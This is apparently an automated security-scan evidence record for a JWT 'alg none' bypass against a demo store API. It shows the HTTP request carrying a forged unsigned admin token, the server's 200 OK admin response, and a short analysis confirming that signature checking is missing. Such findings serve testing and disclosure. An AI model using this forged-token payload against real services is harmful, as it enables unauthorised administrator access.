## Evidence: jwt-alg-none — JWT Algorithm None Bypass

### Request
GET /api/v1/users/me HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"user":"admin","role":"admin"}

### Analysis
The jwt token with alg set to none and no signature is accepted. The algorithm validation is missing, confirming the jwt alg none bypass.
